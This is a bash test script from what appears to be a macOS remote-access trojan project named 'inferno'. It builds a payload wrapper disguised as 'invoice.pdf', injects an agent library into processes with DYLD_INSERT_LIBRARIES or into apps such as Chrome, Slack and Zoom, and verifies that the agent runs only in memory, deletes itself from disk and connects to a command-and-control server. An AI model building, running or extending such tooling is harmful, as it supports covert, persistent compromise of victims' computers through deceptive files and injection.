#!/bin/bash
set -e

SERVER_IP="127.0.0.1"
SERVER_PORT=4242
BUILD_DIR="$(pwd)/build"

echo "=== Phase 4A/Tier 2 — Manual Verification ==="
echo ""

# 0. Cleanup — kill any running instances and injectable apps
pkill -9 -f inferno_client 2>/dev/null || true
pkill -9 -f inferno_shim   2>/dev/null || true
pkill -9 -f inferno_server 2>/dev/null || true
# Kill common injectable targets so Tier 2 can launch them fresh
pkill -9 -f "Google Chrome" 2>/dev/null || true
pkill -9 -f "Discord" 2>/dev/null || true
pkill -9 -f "Slack" 2>/dev/null || true
pkill -9 -f "Zoom" 2>/dev/null || true
sleep 1
rm -f /tmp/.inferno_agent.dylib /tmp/invoice_wrapper /tmp/.inferno_agent_*.dylib

# 1. Build
echo "--- Step 0: Build ---"
cmake --build build --target inferno_wrapper --target inferno_agent_dylib --target inferno_shim 2>&1 | tail -2
# Copy binaries to /tmp to avoid colon-in-path issues on macOS
cp "$BUILD_DIR/wrapper/invoice.pdf" /tmp/invoice_wrapper
cp "$BUILD_DIR/libinferno_agent.dylib" /tmp/libinferno_agent.dylib
cp "$BUILD_DIR/inferno_shim" /tmp/inferno_shim
echo ""

# 2. Unit tests
echo "--- Stage 1: Unit Tests ---"
"$BUILD_DIR/inferno_tests" 2>&1 | grep -E "injector|PASS|FAIL"
echo ""

# 3. Stage 2: shim loads dylib directly (from /tmp to avoid colon in path)
echo "--- Stage 2: Shim + Dylib Direct Load ---"
INFERNO_SERVER_IP=$SERVER_IP INFERNO_SERVER_PORT=$SERVER_PORT \
DYLD_INSERT_LIBRARIES=/tmp/libinferno_agent.dylib \
/tmp/inferno_shim &
SHIM_PID=$!
sleep 2

if kill -0 $SHIM_PID 2>/dev/null; then
    echo "[PASS] inferno_shim is running (PID $SHIM_PID)"
else
    echo "[FAIL] inferno_shim exited unexpectedly"
    exit 1
fi

if pgrep -q inferno_client; then
    echo "[FAIL] inferno_client process found"
    exit 1
fi
echo "[PASS] No inferno_client process"
kill $SHIM_PID 2>/dev/null || true
wait $SHIM_PID 2>/dev/null || true
echo ""

# 4. Stage 3: Full wrapper injection with C2 server
echo "--- Stage 3: Wrapper Injection + C2 Connection ---"
"$BUILD_DIR/inferno_server" > /tmp/srv.log 2>&1 &
SERVER_PID=$!
sleep 2

if kill -0 $SERVER_PID 2>/dev/null; then
    echo "[PASS] inferno_server is running (PID $SERVER_PID)"
else
    echo "[FAIL] inferno_server failed to start"
    exit 1
fi

/tmp/invoice_wrapper $SERVER_IP $SERVER_PORT > /tmp/wrp.log 2>&1 &
sleep 8

echo "=== Wrapper log ==="
cat /tmp/wrp.log
echo ""

echo "=== Process check ==="
ps aux | grep -E "inferno|inferno_shim|\.inferno_agent" | grep -v grep || echo "(none)"

# Check for agent binary (must NOT be present — injection is memory-only)
if pgrep -q inferno_client; then
    echo "[FAIL] inferno_client process found"
    exit 1
fi
echo "[PASS] No inferno_client process"

# Check dylib deleted from disk
if ls /tmp/.inferno_agent_*.dylib 2>/dev/null; then
    echo "[FAIL] dylib still on disk"
    exit 1
fi
echo "[PASS] Dylib deleted from disk"

# Log which mode was used
if grep -q "Tier 2 succeeded" /tmp/wrp.log 2>/dev/null; then
    echo "[INFO] Wrapper used Tier 2 (injected into target app)"
elif grep -q "Falling back" /tmp/wrp.log 2>/dev/null; then
    echo "[INFO] Wrapper fell back to Tier 1 (shim injection)"
fi

# Wait for C2 connection — may come via Tier 2 or Tier 1 fallback
echo "[INFO] Waiting for C2 connection..."
sleep 4

if grep -q "Agent connected" /tmp/srv.log 2>/dev/null; then
    echo "[PASS] Agent connected to C2 server"
    grep "Agent connected" /tmp/srv.log
else
    echo "[FAIL] Agent did not connect to server"
    echo "--- Server log ---"
    cat /tmp/srv.log
    exit 1
fi

echo ""
echo "=== Phase 4A: ALL VERIFICATIONS PASSED ==="

# Cleanup
kill $SERVER_PID 2>/dev/null || true
pkill -9 -f inferno_shim 2>/dev/null || true
